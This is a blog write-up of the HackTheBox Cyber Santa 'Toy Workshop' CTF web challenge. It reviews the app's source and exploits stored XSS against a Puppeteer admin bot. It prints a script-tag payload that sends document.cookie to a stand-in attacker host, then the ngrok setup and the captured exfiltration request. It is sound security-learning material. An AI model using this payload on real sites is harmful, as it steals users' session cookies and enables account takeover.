---
layout: post
title: "HTB Cyber Santa Writeups: Toy Workshop"
image: ''
date:   2021-12-06 00:00:00
tags:
- hackthebox
- htb-cyber-santa
- web
- xss
- csrf
- puppeteer-js
- beginner
description: ''
categories:
published: true
comments: false
---

![intro](https://an00brektn.github.io/img/htb-cyber-santa/Pasted image 20211205131825.png)

## Intro
Although I really should have been working on final projects as this semester comes to a close, HackTheBox ran their "Cyber Santa is Coming to Town" CTF for the last five days. Since school was getting a little demanding, I was not able to spend as much time on the CTF as I would have liked, but there were a few challenges that I'd like to highlight here on this blog because they were interesting.

"Toy Workshop" was the web challenge released on day 1 and showed off an interesting way to do a classic XSS attack. We'll start by finding a simple web app where we can forward messages to the "manager" of the workshop. Looking at the source code, we see that the queries are stored in a SQL database, and viewed using the "puppeteer" module, which creates a browser instance to view the database(probably to emulate the "manager"). We can leverage this by writing a XSS payload to take the cookie stored in the browser, and send it to a simple webserver using ngrok to tunnel the traffic to our VM. 

* buh
{:toc}

### Description
`The work is going well on Santa's toy workshop but we lost contact with the manager in charge! We suspect the evil elves have taken over the workshop, can you talk to the worker elves and find out?`

## Understanding the Web App
### Initial Behavior
Just throwing the address we're given into the search bar gives us this:

![asdf](https://an00brektn.github.io/img/htb-cyber-santa/Pasted image 20211206095114.png)

There's a lot of fancy javascript animation going on, and honestly I could probably watch the "transformation portal" (or whatever it is) for a while. The only functionality that is accessible is when we click on an elf. We're told that the manager is busy, but the message will be forwarded. I can type in whatever I want, and get a "Your message is delivered successfully!" in response.

![asdf](https://an00brektn.github.io/img/htb-cyber-santa/Pasted image 20211206095345.png)

There isn't really anything left to do here unless we want to admire the animation some more.

### Code Review
The source code we're given, excluding the `/static` directory, looks like this.  
```
kali@transistor:~/ctf/santa_htb/day1/web_toy_workshop$ tree
.
├── build-docker.sh
├── challenge
│   ├── bot.js
│   ├── database.js
│   ├── index.js
│   ├── package.json
│   ├── routes
│   │   └── index.js
│   ├── static
│   │   ├── ...[trim]...
│   └── views
│       ├── index.hbs
│       └── queries.hbs
├── config
│   └── supervisord.conf
└── Dockerfile
```

It's a pretty sparse web app. Interestingly, we don't have a "flag" file. Aside from that, we define some routes, a database, a bot, and the web page itself, which isn't a lot. Let's follow the user input through the web app, starting with the routes.

```js
const express        = require('express');
const router         = express.Router();
const bot            = require('../bot');

let db;

const response = data => ({ message: data });

router.get('/', (req, res) => {
	return res.render('index');
});

router.post('/api/submit', async (req, res) => {

		const { query } = req.body;
		if(query){
			return db.addQuery(query)
				.then(() => {
					bot.readQueries(db);
					res.send(response('Your message is delivered successfully!'));
				});
		}
		return res.status(403).send(response('Please write your query first!'));
});

router.get('/queries', async (req, res, next) => {
	if(req.ip != '127.0.0.1') return res.redirect('/');

	return db.getQueries()
		.then(queries => {
			res.render('queries', { queries });
		})
		.catch(() => res.status(500).send(response('Something went wrong!')));
});

module.exports = database => { 
	db = database;
	return router;
};
```

We see that there are 3 different endpoints, but only two are accessible to us. 
- The `/` will show us what we originally saw in "Initial Behavior". 
- The `/api/submit` handles the requests we were sending, and adds it to the database of requests. The "bot" (again, probably the simulated manager), will then read those queries, and tell us if we're successful.
- The `/queries` is only accessible from the localhost, and will render out a list of the queries from the database.

Since there's no immediate way to get to the `/queries`, we can try looking at the database. These are the relevant functions.

```js
async addQuery(query) {
	return new Promise(async (resolve, reject) => {
		try {
			let stmt = await this.db.prepare('INSERT INTO queries (query) VALUES (?)');
			resolve(await stmt.run(query));
		} catch(e) {
			reject(e);
		}
	});
}

async getQueries() {
	return new Promise(async (resolve, reject) => {
		try {
			let stmt = await this.db.prepare('SELECT * FROM queries');
			resolve(await stmt.all());
		} catch(e) {
			reject(e);
		}
	});
}
```

We have some prepared statements to insert values into the SQL database, and to return values. This means we're not really going to be able to do a SQL injection, as prepared statements handle the query and the user input separately, effectively preventing any SQL injections. Recall that after this, the "bot", reads the queries.

```js
const puppeteer = require('puppeteer');

const browser_options = {
	headless: true,
	args: [
		'--no-sandbox',
		'--disable-background-networking',
		'--disable-default-apps',
		'--disable-extensions',
		'--disable-gpu',
		'--disable-sync',
		'--disable-translate',
		'--hide-scrollbars',
		'--metrics-recording-only',
		'--mute-audio',
		'--no-first-run',
		'--safebrowsing-disable-auto-update',
		'--js-flags=--noexpose_wasm,--jitless'
	]
};

const cookies = [{
	'name': 'flag',
	'value': 'HTB{f4k3_fl4g_f0r_t3st1ng}'
}];


const readQueries = async (db) => {
		const browser = await puppeteer.launch(browser_options);
		let context = await browser.createIncognitoBrowserContext();
		let page = await context.newPage();
		await page.goto('http://127.0.0.1:1337/');
		await page.setCookie(...cookies);
		await page.goto('http://127.0.0.1:1337/queries', {
			waitUntil: 'networkidle2'
		});
		await browser.close();
		await db.migrate();
};

module.exports = { readQueries };
```

This is where it all comes together, for a couple of reasons.
1. We've found where the flag is, in the cookies of the browser that this script opens
2. When `readQueries()` is called, it will (1) access that endpoint that we can't, and (2) display all of the queries that we've input on to the page
3. The database will also reset everytime we send a message, meaning we only need one input

## Grabbing the Flag
### Strategy
Grabbing another user's cookie is not unheard of. It's possible with a number of attacks, depending on the context, but it most commonly revolves around Cross-Site Scripting (XSS). As defined by [PortSwigger](https://portswigger.net/web-security/cross-site-scripting): 

> "Cross-site scripting works by manipulating a vulnerable web site so that it returns malicious JavaScript to users. When the malicious code executes inside a victim's browser, the attacker can fully compromise their interaction with the application."

Essentially, since the `/queries` page renders the queries we've submitted, we're free to also insert HTML tags like `<h1></h1>`, since the prepared statement likely isn't filtering those characters. The important tag here is `<script></script>`, which will execute whatever javascript we want, which we can use to fetch the cookie. The next question is how we get the cookie using javascript. Luckily, the payload is pretty simple:

```html
<script>fetch('https://hacker.thm/steal?cookie=' + btoa(document.cookie));</script>
```

This payload will send a request to a website that I control, and stick the cookie (encoded in base64 using the `btoa()` function) in the url. The website doesn't have to have any functionality; as long as I log the request, I'll be able to decode the cookie and get the flag.

### Setup and Attack
Since I'm working out of a VM, I'll use `ngrok` to tunnel traffic to my Kali machine.
```bash
kali@transistor:~/ctf/santa_htb/day1/web_toy_workshop$ /opt/ngrok tcp 80
```

While I could use netcat to catch the request, I like using [this Python script](https://gist.github.com/mdonkers/63e115cc0c79b4f6b8b3a6b797e485c7) to spin up a webserver where I can see the full GET request, headers and all. We also used this in [H@cktivitycon's OPA Secrets](https://an00brektn.github.io/hacktivitycon-opa/) challenge.

On the website, I'll submit the payload from earlier, replacing `hacker.thm` for the `ngrok` instance that I have, and replacing `https` with `http` because setting up `https` is too much work for a CTF.

![asdf](https://an00brektn.github.io/img/htb-cyber-santa/Pasted image 20211206103343.png)

After a few seconds, I get a request on my Python server.

```http
INFO:root:GET request,
Path: /steal?cookie=ZmxhZz1IVEJ7M3YxbF8zbHYzc180cjNfcjFzMW5nX3VwIX0=
Headers:
Host: 0.tcp.ngrok.io:18605
Connection: keep-alive
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/93.0.4577.0 Safari/537.36
Accept: */*
Origin: http://127.0.0.1:1337
Referer: http://127.0.0.1:1337/
Accept-Encoding: gzip, deflate



127.0.0.1 - - [06/Dec/2021 11:33:15] "GET /steal?cookie=ZmxhZz1IVEJ7M3YxbF8zbHYzc180cjNfcjFzMW5nX3VwIX0= HTTP/1.1" 200 -
```

Decoding the base64, we get the flag.
```bash
kali@transistor:~/ctf/santa_htb/day1/web_toy_workshop$ echo "ZmxhZz1IVEJ7M3YxbF8zbHYzc180cjNfcjFzMW5nX3VwIX0=" | base64 -d; echo
flag=HTB{3v1l_3lv3s_4r3_r1s1ng_up!}
```